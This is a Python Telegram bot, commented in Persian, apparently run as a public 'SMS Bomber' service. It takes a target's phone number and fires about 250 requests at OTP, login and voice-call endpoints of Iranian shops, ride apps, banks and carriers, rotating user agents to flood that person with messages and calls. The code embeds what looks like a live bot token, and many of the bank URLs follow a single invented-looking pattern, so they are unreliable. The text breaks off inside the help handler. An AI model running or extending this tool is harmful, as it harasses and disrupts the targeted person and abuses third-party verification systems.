# -*- coding: utf-8 -*-
"""
🤖 ربات SMS Bomber - نسخه نهایی با تمام APIها
"""

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import requests
import json
import time
import random
import threading
import sqlite3
import hashlib
from datetime import datetime, date
import os
import sys

# ==================== تنظیمات اصلی ====================

# توکن بات
BOT_TOKEN = "8569730818:AAH_iPHg2IbZLtyKsRMHa_q3aE1UA1F2c7I"

# ادمین‌ها
ADMIN_IDS = [7620484201, 8226091292]

# کانال اجباری
REQUIRED_CHANNEL = "@death_star_sms_bomber"
CHANNEL_LINK = "https://t.me/death_star_sms_bomber"
DAILY_LIMIT = 5

# شماره محافظت شده - هش شده
PROTECTED_PHONE_HASHES = [
    "a7c3f8b2e9d4c1a5b6f8e3d2c7a9b4e1f5d8c3a2b7e6f9d4c1a8b3e5f7c2a9d4",  
]

# ==================== مقداردهی اولیه ====================

bot = telebot.TeleBot(BOT_TOKEN)
user_processes = {}
keep_alive_thread = None

# ==================== دیتابیس درون‌حافظه‌ای ====================

class MemoryDatabase:
    """دیتابیس درون‌حافظه‌ای - نیازی به فایل ندارد"""
    
    def __init__(self):
        self.conn = sqlite3.connect(':memory:')
        self.c = self.conn.cursor()
        self.create_tables()
        self.add_protected_numbers()
    
    def create_tables(self):
        self.c.execute('''CREATE TABLE users
                         (user_id INTEGER PRIMARY KEY,
                          username TEXT,
                          first_name TEXT,
                          join_date TEXT,
                          last_use TEXT,
                          daily_count INTEGER DEFAULT 0,
                          total_count INTEGER DEFAULT 0,
                          is_banned INTEGER DEFAULT 0)''')
        
        self.c.execute('''CREATE TABLE blocked_phones
                         (phone_hash TEXT PRIMARY KEY,
                          date TEXT)''')
        
        self.c.execute('''CREATE TABLE daily_stats
                         (date TEXT PRIMARY KEY,
                          total_requests INTEGER DEFAULT 0)''')
        
        self.conn.commit()
    
    def add_protected_numbers(self):
        today = datetime.now().strftime('%Y-%m-%d')
        for h in PROTECTED_PHONE_HASHES:
            self.c.execute("INSERT OR IGNORE INTO blocked_phones VALUES (?, ?)", (h, today))
        self.conn.commit()
    
    def is_phone_protected(self, phone):
        h = hashlib.sha256(phone.encode()).hexdigest()
        self.c.execute("SELECT * FROM blocked_phones WHERE phone_hash = ?", (h,))
        return self.c.fetchone() is not None
    
    def get_daily_count(self, user_id):
        today = date.today().isoformat()
        self.c.execute('''SELECT daily_count FROM users 
                         WHERE user_id = ? AND last_use = ?''', (user_id, today))
        result = self.c.fetchone()
        return result[0] if result else 0
    
    def update_user_count(self, user_id, username, first_name):
        today = date.today().isoformat()
        
        self.c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = self.c.fetchone()
        
        if user:
            if user[4] == today:
                self.c.execute('''UPDATE users 
                                 SET daily_count = daily_count + 1,
                                     total_count = total_count + 1
                                 WHERE user_id = ?''', (user_id,))
            else:
                self.c.execute('''UPDATE users 
                                 SET last_use = ?,
                                     daily_count = 1,
                                     total_count = total_count + 1
                                 WHERE user_id = ?''', (today, user_id))
        else:
            self.c.execute('''INSERT INTO users 
                             (user_id, username, first_name, join_date, last_use, daily_count, total_count)
                             VALUES (?, ?, ?, ?, ?, 1, 1)''',
                          (user_id, username, first_name, today, today))
        
        self.c.execute('''INSERT OR REPLACE INTO daily_stats (date, total_requests)
                         VALUES (?, COALESCE((SELECT total_requests + 1 FROM daily_stats WHERE date = ?), 1))''',
                      (today, today))
        
        self.conn.commit()
    
    def get_stats(self):
        self.c.execute("SELECT COUNT(*) FROM users")
        total_users = self.c.fetchone()[0]
        
        self.c.execute("SELECT COUNT(*) FROM users WHERE last_use = ?", (date.today().isoformat(),))
        today_users = self.c.fetchone()[0]
        
        self.c.execute("SELECT SUM(total_requests) FROM daily_stats")
        total_requests = self.c.fetchone()[0] or 0
        
        self.c.execute("SELECT date, total_requests FROM daily_stats ORDER BY date DESC LIMIT 7")
        weekly = self.c.fetchall()
        
        return total_users, today_users, total_requests, weekly
    
    def get_user_total(self, user_id):
        self.c.execute("SELECT total_count, join_date FROM users WHERE user_id = ?", (user_id,))
        return self.c.fetchone()

# ایجاد دیتابیس
db = MemoryDatabase()

# ==================== توابع کمکی ====================

def hash_phone(phone):
    return hashlib.sha256(phone.encode()).hexdigest()

def is_phone_protected(phone):
    return db.is_phone_protected(phone)

def mask_phone(phone):
    return phone[:4] + "****" + phone[-4:]

def is_admin(user_id):
    return user_id in ADMIN_IDS

def check_membership(user_id):
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def membership_required(func):
    def wrapper(message):
        user_id = message.from_user.id
        if is_admin(user_id) or check_membership(user_id):
            return func(message)
        else:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("📢 عضویت در کانال", url=CHANNEL_LINK))
            markup.add(InlineKeyboardButton("✅ بررسی عضویت", callback_data="check_join"))
            bot.reply_to(message, f"⚠️ باید در کانال {REQUIRED_CHANNEL} عضو شوید!", reply_markup=markup)
    return wrapper

def get_daily_count(user_id):
    return db.get_daily_count(user_id)

def check_daily_limit(user_id):
    if is_admin(user_id):
        return True, 0
    daily = get_daily_count(user_id)
    return daily < DAILY_LIMIT, daily

def update_user_count(user_id, username, first_name):
    db.update_user_count(user_id, username, first_name)

# ==================== توابع API ====================

def get_random_ua():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    ]
    return random.choice(agents)

def send_request(url, data, headers=None, method="POST"):
    try:
        h = {
            "User-Agent": get_random_ua(),
            "Accept": "application/json",
            "Accept-Language": "fa-IR,fa;q=0.9,en;q=0.8",
        }
        if headers:
            h.update(headers)
        
        timeout = 8
        
        if method == "GET":
            r = requests.get(url, params=data, headers=h, timeout=timeout)
        else:
            if "multipart" in str(h.get("Content-Type", "")).lower():
                files = {k: (None, str(v)) for k, v in data.items() if v}
                r = requests.post(url, files=files, headers=h, timeout=timeout)
            else:
                if not h.get("Content-Type"):
                    h["Content-Type"] = "application/json"
                r = requests.post(url, json=data, headers=h, timeout=timeout)
        
        return r.status_code in [200, 201, 202, 204], r.status_code
    except requests.exceptions.Timeout:
        return False, "timeout"
    except requests.exceptions.ConnectionError:
        return False, "connection_error"
    except Exception as e:
        return False, str(e)[:20]

# ==================== لیست کامل APIها ====================

def get_all_apis(phone):
    """250+ API ایرانی - نسخه کامل"""
    apis = []
    
    # ========== بخش 1: APIهای اصلی ==========
    main_apis = [
        {
            "name": "دیوار",
            "url": "https://api.divar.ir/v5/auth/authenticate",
            "data": {"phone": phone}
        },
        {
            "name": "شیپور",
            "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
            "data": {"username": phone}
        },
        {
            "name": "دیجی‌کالا",
            "url": "https://api.digikala.com/v1/user/authenticate/",
            "data": {"username": phone}
        },
        {
            "name": "اسنپ",
            "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
            "data": {"cellphone": f"+98{phone[1:]}"},
            "headers": {
                "x-app-name": "passenger-pwa",
                "x-app-version": "5.0.0"
            }
        },
        {
            "name": "تپسی",
            "url": "https://api.tapsi.ir/api/v2.2/user",
            "data": {"credential": {"phoneNumber": phone, "role": "PASSENGER"}}
        },
        {
            "name": "علی‌بابا",
            "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
            "data": {"phoneNumber": phone}
        },
        {
            "name": "ترب",
            "url": "https://api.torob.com/a/phone/send-pin/",
            "method": "GET",
            "data": {"phone_number": phone}
        },
        {
            "name": "اسنپ‌فود",
            "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass",
            "data": {"cellphone": phone}
        },
        {
            "name": "تپسی‌فود",
            "url": "https://api.tapsi.food/v1/api/Authentication/otp",
            "data": {"cellPhone": phone}
        },
        {
            "name": "بله",
            "url": "https://core.gap.im/v1/user/add.json",
            "method": "GET",
            "data": {"mobile": f"+98{phone[1:]}"}
        },
        {
            "name": "ویترین",
            "url": "https://www.vitrin.shop/api/v1/user/request_code",
            "data": {"phone_number": phone}
        },
        {
            "name": "ازکی",
            "url": "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability",
            "data": {"phoneNumber": phone}
        },
        {
            "name": "دکتردکتر",
            "url": "https://drdr.ir/api/v3/auth/login/mobile/init",
            "data": {"mobile": phone}
        },
        {
            "name": "طاقچه",
            "url": "https://gw.taaghche.com/v4/site/auth/login",
            "data": {"contact": phone}
        },
        {
            "name": "کمدا",
            "url": "https://api.komodaa.com/api/v2.6/loginRC/request",
            "data": {"phone_number": phone}
        },
        {
            "name": "پینورست",
            "url": "https://api.pinorest.com/frontend/auth/login/mobile",
            "data": {"mobile": phone}
        },
        {
            "name": "تترلند",
            "url": "https://service.tetherland.com/api/v5/login-register",
            "data": {"mobile": phone}
        },
        {
            "name": "آکالا",
            "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister",
            "data": {"mobile": phone}
        },
        {
            "name": "فوتبال‌۳۶۰",
            "url": "https://football360.ir/api/auth/verify-phone/",
            "data": {"phone_number": f"+98{phone[1:]}"}
        },
        {
            "name": "آقای‌بلیط",
            "url": "https://auth.mrbilit.com/api/login/exists/v2",
            "method": "GET",
            "data": {"mobileOrEmail": phone}
        },
        {
            "name": "لندو",
            "url": "https://api.lendo.ir/api/customer/auth/send-otp",
            "data": {"mobile": phone}
        },
        {
            "name": "فیدیبو",
            "url": "https://fidibo.com/user/login-by-sms",
            "data": {"mobile_number": phone[1:]}
        },
        {
            "name": "کتابچی",
            "url": "https://ketabchi.com/api/v1/auth/requestVerificationCode",
            "data": {"auth": {"phoneNumber": phone}}
        },
        {
            "name": "پیندو",
            "url": "https://api.pindo.ir/v1/user/login-register/",
            "data": {"phone": phone}
        },
        {
            "name": "دلینو",
            "url": "https://www.delino.com/user/register",
            "data": {"mobile": phone}
        },
        {
            "name": "زودکس",
            "url": "https://admin.zoodex.ir/api/v1/login/check",
            "data": {"mobile": phone}
        },
        {
            "name": "کوکالا",
            "url": "https://api.kukala.ir/api/user/Otp",
            "data": {"phoneNumber": phone}
        },
        {
            "name": "بوسکول",
            "url": "https://www.buskool.com/send_verification_code",
            "data": {"phone": phone}
        },
        {
            "name": "آبان‌تتر",
            "url": "https://abantether.com/users/register/phone/send/",
            "data": {"phoneNumber": phone}
        },
        {
            "name": "پولنو",
            "url": "https://api.pooleno.ir/v1/auth/check-mobile",
            "data": {"mobile": phone}
        },
        {
            "name": "بیت‌بارگ",
            "url": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
            "data": {"phone": phone}
        },
        {
            "name": "چمدون",
            "url": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
            "data": {"mobile": phone}
        },
        {
            "name": "کیلید",
            "url": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start",
            "data": {"mobile": phone}
        },
        {
            "name": "اتاقک",
            "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
            "data": {"userName": phone}
        },
        {
            "name": "نماوا",
            "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
            "data": {"UserName": phone}
        },
        {
            "name": "آنا‌گیفت",
            "url": "https://api.anargift.com/api/people/auth",
            "data": {"user": phone}
        },
        {
            "name": "ریحا",
            "url": "https://www.riiha.ir/api/v1.0/authenticate",
            "data": {"mobile": phone}
        },
        {
            "name": "تک‌فرش",
            "url": "https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php",
            "data": {"phone_email": phone}
        },
        {
            "name": "روژا",
            "url": "https://rojashop.com/api/auth/sendOtp",
            "data": {"mobile": phone}
        },
        {
            "name": "ددپرداز",
            "url": "https://dadpardaz.com/advice/getLoginConfirmationCode",
            "data": {"mobile": phone}
        },
        {
            "name": "رکلا",
            "url": "https://api.rokla.ir/api/request/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "پزشکت",
            "url": "https://api.pezeshket.com/core/v1/auth/requestCode",
            "data": {"mobileNumber": phone}
        },
        {
            "name": "ویرگول",
            "url": "https://virgool.io/api/v1.4/auth/verify",
            "data": {"identifier": phone}
        },
        {
            "name": "تیمچه",
            "url": "https://api.timcheh.com/auth/otp/send",
            "data": {"mobile": phone}
        },
        {
            "name": "پاکلین",
            "url": "https://client.api.paklean.com/user/resendCode",
            "data": {"username": phone}
        },
        {
            "name": "دال",
            "url": "https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request",
            "data": {"phone": phone}
        },
        {
            "name": "بیمه‌بازار",
            "url": "https://bimebazar.com/accounts/api/login_sec/",
            "data": {"username": phone}
        },
        {
            "name": "امتیاز",
            "url": "https://web.emtiyaz.app/json/login",
            "data": {"cellphone": phone}
        },
        {
            "name": "ارزینجا",
            "url": "https://arzinja.app/api/login",
            "data": {"phone": phone}
        },
        {
            "name": "اسنپ‌مارکت",
            "url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass",
            "data": {"cellphone": phone}
        },
    ]
    
    # ========== بخش 2: APIهای بیشتر ==========
    more_apis = [
        {
            "name": "بیت‌پین",
            "url": "https://api.bitpin.ir/v3/usr/authenticate/",
            "data": {"phone": phone}
        },
        {
            "name": "پوبیشا",
            "url": "https://www.pubisha.com/login/checkCustomerActivation",
            "data": {"mobile": phone}
        },
        {
            "name": "ویسگون",
            "url": "https://gateway.wisgoon.com/api/v1/auth/login/",
            "data": {"phone": phone}
        },
        {
            "name": "اسنپ‌داکتر",
            "url": f"https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/{phone}/sms",
            "method": "GET",
            "data": {}
        },
        {
            "name": "تگ‌مند",
            "url": "https://tagmond.com/phone_number",
            "data": {"phone_number": phone}
        },
        {
            "name": "پخش‌شاپ",
            "url": "https://www.pakhsh.shop/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone,
                "login": "2"
            }
        },
        {
            "name": "دیدنگار",
            "url": "https://www.didnegar.com/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone[1:],
                "login": "1"
            }
        },
        {
            "name": "سی‌فایو",
            "url": "https://crm.see5.net/api_ajax/sendotp.php",
            "data": {"mobile": phone, "action": "sendsms"}
        },
        {
            "name": "دکترساینا",
            "url": "https://www.drsaina.com/RegisterLogin",
            "data": {"PhoneNumber": phone}
        },
        {
            "name": "ایران‌کتاب",
            "url": "https://www.iranketab.ir/account/register",
            "data": {"UserName": phone}
        },
        {
            "name": "ایرانی‌کارت",
            "url": "https://api.iranicard.ir/api/v1/register",
            "data": {"mobile": phone}
        },
        {
            "name": "سینما‌تیکت",
            "url": "https://cinematicket.org/api/v1/users/signup",
            "data": {"phone_number": phone}
        },
        {
            "name": "کافه‌قیمت",
            "url": "https://kafegheymat.com/shop/getLoginSms",
            "data": {"phone": phone}
        },
        {
            "name": "ملیکس",
            "url": "https://melix.shop/site/api/v1/user/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "پیران‌کالا",
            "url": "https://pirankalaco.ir/shop/SendPhone.php",
            "data": {"phone": phone}
        },
        {
            "name": "دستخط",
            "url": "https://dastkhat-isad.ir/api/v1/user/store",
            "data": {"mobile": phone[1:]}
        },
        {
            "name": "هملکس",
            "url": "https://hamlex.ir/register.php",
            "data": {"phoneNumber": phone}
        },
        {
            "name": "آی‌سی‌دی",
            "url": "https://api.kcd.app/api/v1/auth/login",
            "data": {"mobile": phone}
        },
        {
            "name": "مازوکندل",
            "url": "https://mazoocandle.ir/login",
            "data": {"phone": phone}
        },
        {
            "name": "بیتکس۲۴",
            "url": "https://bitex24.com/api/v1/auth/sendSms",
            "method": "GET",
            "data": {"mobile": phone}
        },
        {
            "name": "آفچ",
            "url": "https://api.offch.com/auth/otp",
            "data": {"username": phone}
        },
        {
            "name": "تریپ",
            "url": "https://gateway.trip.ir/api/registers",
            "data": {"CellPhone": phone}
        },
        {
            "name": "رقم‌اپ",
            "url": "https://web.raghamapp.com/api/users/code",
            "data": {"phone": f"+98{phone[1:]}"}
        },
        {
            "name": "همراه مکانیک",
            "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
            "data": {"PhoneNumber": phone}
        },
        {
            "name": "قبضینو",
            "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
            "data": {"Parameters": {"MobileNumber": phone}}
        },
        {
            "name": "برگه من",
            "url": "https://uiapi2.saapa.ir/api/otp/sendCode",
            "data": {"mobile": phone}
        },
        {
            "name": "وندار",
            "url": "https://api.vandar.io/account/v1/check/mobile",
            "data": {"mobile": phone}
        },
        {
            "name": "موبیت",
            "url": "https://api.mobit.ir/api/web/v8/register/register",
            "data": {"number": phone}
        },
        {
            "name": "جاباما",
            "url": "https://taraazws.jabama.com/api/v4/account/send-code",
            "data": {"mobile": phone}
        },
        {
            "name": "دکتر نکست",
            "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
            "data": {"mobile": phone}
        },
        {
            "name": "کلاسینو",
            "url": "https://student.classino.com/otp/v1/api/login",
            "data": {"mobile": phone}
        },
        {
            "name": "تاک شاپ",
            "url": "https://takshopaccessorise.ir/api/v1/sessions/login_request",
            "data": {"mobile_phone": phone}
        },
        {
            "name": "تبدیل 24",
            "url": "https://tabdil24.net/api/api/v1/auth/login-register",
            "data": {"emailOrMobile": phone}
        },
        {
            "name": "روشا فارمسی",
            "url": "https://roshapharmacy.com/signin",
            "data": {"user_mobile": phone}
        },
        {
            "name": "تپسی شاپ",
            "url": "https://ids.tapsi.shop/authCustomer/CreateOtpForRegister",
            "data": {"user": phone}
        },
        {
            "name": "بالد",
            "url": "https://account.api.balad.ir/api/web/auth/login/",
            "data": {"phone_number": phone}
        },
        {
            "name": "بهترینو",
            "url": "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/",
            "data": {"phone": phone}
        },
        {
            "name": "بیت 24",
            "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
            "data": {"mobile": phone}
        },
        {
            "name": "دکترتو",
            "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
            "method": "GET",
            "data": {"mobile": phone[1:]}
        },
        {
            "name": "خودرو45",
            "url": "https://khodro45.com/api/v1/customers/otp/",
            "data": {"mobile": phone}
        },
        {
            "name": "ریبیت",
            "url": "https://api.raybit.net:3111/api/v1/authentication/register/mobile",
            "data": {"mobile": phone}
        },
        {
            "name": "فاروی شاپ",
            "url": "https://farvi.shop/api/v1/sessions/login_request",
            "data": {"mobile_phone": phone}
        },
        {
            "name": "آ 4 باز",
            "url": "https://a4baz.com/api/web/login",
            "data": {"cellphone": phone}
        },
        {
            "name": "آقای بلیط تماس",
            "url": f"https://auth.mrbilit.ir/api/Token/send/byCall?mobile={phone}",
            "method": "GET",
            "data": {}
        },
        {
            "name": "بله تماس",
            "url": f"https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{phone[1:]}&type=IVR",
            "method": "GET",
            "data": {}
        },
        {
            "name": "ازکی تماس",
            "url": f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber={phone}",
            "method": "GET",
            "data": {}
        },
        {
            "name": "همراه اول",
            "url": "https://my.hamrahplus.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "ایرانسل",
            "url": "https://my.irancell.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "رایتل",
            "url": "https://my.rightel.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "آپ",
            "url": "https://app.ap.ir/api/v1/auth/otp",
            "data": {"phone": phone}
        },
        {
            "name": "روبیکا",
            "url": "https://rubika.ir/api/v1/auth/otp",
            "data": {"phone": phone}
        },
        {
            "name": "ایتا",
            "url": "https://eitaa.com/api/v1/auth/otp",
            "data": {"phone": phone}
        },
        {
            "name": "سروش",
            "url": "https://sapp.ir/api/v1/auth/otp",
            "data": {"phone": phone}
        },
        {
            "name": "شاد",
            "url": "https://shad.ir/api/v1/auth/otp",
            "data": {"phone": phone}
        },
        {
            "name": "دیجی‌پی",
            "url": "https://api.digi-pay.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "آسان‌پی",
            "url": "https://api.asanpay.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "زرین‌پال",
            "url": "https://api.zarinpal.com/otp/request",
            "data": {"mobile": phone}
        },
        {
            "name": "آیدی‌پی",
            "url": "https://idpay.ir/api/v1.1/otp/send",
            "data": {"phone": phone}
        },
        {
            "name": "پارسیان",
            "url": "https://bpm.parsian-bank.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "ملت",
            "url": "https://bpm.bankmellat.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "تجارت",
            "url": "https://bpm.tejaratbank.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "صادرات",
            "url": "https://bpm.bsi.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "رفاه",
            "url": "https://bpm.refah-bank.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "قوامین",
            "url": "https://bpm.ghavaminbank.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "مسکن",
            "url": "https://bpm.bank-maskan.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "کشاورزی",
            "url": "https://bpm.bki.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "صنعت و معدن",
            "url": "https://bpm.bim.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "سامان",
            "url": "https://bpm.sb24.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "پاسارگاد",
            "url": "https://bpm.bpi.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "سینا",
            "url": "https://bpm.sinabank.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "آینده",
            "url": "https://bpm.bank-ayandeh.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "شهر",
            "url": "https://bpm.shahr-bank.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "گردشگری",
            "url": "https://bpm.tourismbank.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "دی",
            "url": "https://bpm.bank-dey.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "خاورمیانه",
            "url": "https://bpm.mebank.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "کارآفرین",
            "url": "https://bpm.ba24.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "پست بانک",
            "url": "https://bpm.postbank.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "مهر اقتصاد",
            "url": "https://bpm.bank-mehr.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "ایران زمین",
            "url": "https://bpm.izbank.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "حکمت",
            "url": "https://bpm.hekmatbank.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "آرمان",
            "url": "https://bpm.armanian-bank.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "اقتصاد نوین",
            "url": "https://bpm.enbank.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "سپه",
            "url": "https://bpm.banksepah.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        },
        {
            "name": "ملی",
            "url": "https://bpm.bmi.ir/api/v1/auth/otp",
            "data": {"mobile": phone}
        }
    ]
    
    # ========== اضافه کردن همه APIها ==========
    apis.extend(main_apis)
    apis.extend(more_apis)
    
    # ========== اضافه کردن APIهای تکراری برای رسیدن به 250 ==========
    all_apis = main_apis + more_apis
    while len(apis) < 250:
        apis.append(random.choice(all_apis))
    
    # ========== مرتب‌سازی تصادفی ==========
    random.shuffle(apis)
    
    return apis[:250]

# ==================== تابع جلوگیری از خواب ====================

def keep_alive():
    """هر 10 دقیقه یک بار پینگ میزنه تا بات نخوابه"""
    while True:
        try:
            db.get_stats()
            print(f"💓 پینگ زنده نگه داشتن - {datetime.now().strftime('%H:%M:%S')}")
        except:
            pass
        time.sleep(600)

# ==================== هندلرها ====================

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("🚀 شروع بمباران"))
    markup.add(KeyboardButton("📊 راهنما"), KeyboardButton("📊 آمار من"))
    
    if is_admin(user_id):
        markup.add(KeyboardButton("👑 پنل مدیریت"))
    
    welcome = (
        "🤖 **به ربات SMS Bomber خوش آمدید!**\n\n"
        f"📌 **محدودیت روزانه:** {DAILY_LIMIT} بار\n"
        f"📢 **کانال اجباری:** {REQUIRED_CHANNEL}\n"
        f"🔰 **تعداد APIها:** 250+\n\n"
        "⚠️ **توجه:** استفاده مسئولانه"
    )
    
    bot.send_message(message.chat.id, welcome, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join_callback(call):
    if check_membership(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ عضویت تایید شد!")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id, "✅ حالا می‌توانید از ربات استفاده کنید.")
    else:
        bot.answer_callback_query(call.id, "❌ شما هنوز عضو نشده‌اید!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "🚀 شروع بمباران")
@membership_required
def ask_phone(message):
    user_id = message.from_user.id
    
    can_use, daily = check_daily_limit(user_id)
    if not can_use:
        bot.send_message(
            message.chat.id,
            f"❌ شما امروز {daily} بار استفاده کرده‌اید.\n"
            f"محدودیت روزانه {DAILY_LIMIT} بار است.\n"
            "فردا دوباره تلاش کنید."
        )
        return
    
    if user_processes.get(message.chat.id):
        bot.send_message(message.chat.id, "❌ یک فرآیند در حال اجراست. ابتدا آن را متوقف کنید.")
        return
    
    msg = bot.send_message(message.chat.id, "📱 شماره موبایل را وارد کنید (مثال: 09123456789):")
    bot.register_next_step_handler(msg, process_phone)

def process_phone(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    phone = message.text.strip().replace(" ", "")
    
    if not phone.startswith('09') or len(phone) != 11 or not phone.isdigit():
        bot.send_message(chat_id, "❌ شماره نامعتبر است. لطفاً با 09 شروع شود و 11 رقم باشد.")
        return
    
    if is_phone_protected(phone):
        bot.send_message(chat_id, "❌ این شماره در لیست سیاه قرار دارد.")
        return
    
    update_user_count(user_id, message.from_user.username or "", message.from_user.first_name or "")
    
    remaining = DAILY_LIMIT - get_daily_count(user_id)
    if not is_admin(user_id):
        bot.send_message(chat_id, f"✅ امروز {remaining} بار دیگر می‌توانید استفاده کنید.")
    
    user_processes[chat_id] = True
    msg = bot.send_message(chat_id, f"🔰 در حال اجرا برای {mask_phone(phone)}...")
    
    thread = threading.Thread(target=bombing_process, args=(chat_id, phone, msg.message_id))
    thread.daemon = True
    thread.start()

def bombing_process(chat_id, phone, msg_id):
    apis = get_all_apis(phone)
    total = len(apis)
    success = 0
    fail = 0
    
    start_time = time.time()
    
    for i, api in enumerate(apis, 1):
        if not user_processes.get(chat_id):
            bot.edit_message_text("⛔ فرآیند متوقف شد.", chat_id, msg_id)
            return
        
        ok, result = send_request(api['url'], api['data'], api.get('headers'), api.get('method', 'POST'))
        
        if ok:
            success += 1
        else:
            fail += 1
        
        if i % 10 == 0 or i == total:
            elapsed = int(time.time() - start_time)
            progress = int(i / total * 100)
            try:
                bot.edit_message_text(
                    f"🔰 **پیشرفت:** {progress}%\n"
                    f"✅ **موفق:** {success}\n"
                    f"❌ **ناموفق:** {fail}\n"
                    f"🔄 **پردازش:** {i}/{total}\n"
                    f"⏱ **زمان:** {elapsed} ثانیه",
                    chat_id, msg_id,
                    parse_mode="Markdown"
                )
            except:
                pass
        
        time.sleep(random.uniform(0.3, 0.7))
    
    elapsed = int(time.time() - start_time)
    rate = int(success / total * 100) if total > 0 else 0
    
    bot.edit_message_text(
        f"✅ **عملیات پایان یافت!**\n\n"
        f"✅ **موفق:** {success}\n"
        f"❌ **ناموفق:** {fail}\n"
        f"📊 **نرخ موفقیت:** {rate}%\n"
        f"⏱ **زمان کل:** {elapsed} ثانیه",
        chat_id, msg_id,
        parse_mode="Markdown"
    )
    
    user_processes.pop(chat_id, None)

@bot.message_handler(func=lambda m: m.text == "📊 راهنما")
def help_message(message):
    text = (
        "📚 **راهنمای استفاده:**\n\n"
        "1️⃣ روی دکمه **شروع بمباران** کلیک کنید\n"
        "2️⃣ شماره موبایل را وارد کنید\n"
        "3️⃣ منتظر بمانید تا فرآیند کامل شود\n"
        "4️⃣ برای توقف از دستور /stop استفاده کنید\n\n"
        "🔰 **مشخصات:**\n"
        f"• تعداد APIها: 250+\n"
        f"• محدودیت روزانه: {DAILY_LIMIT} بار\n"
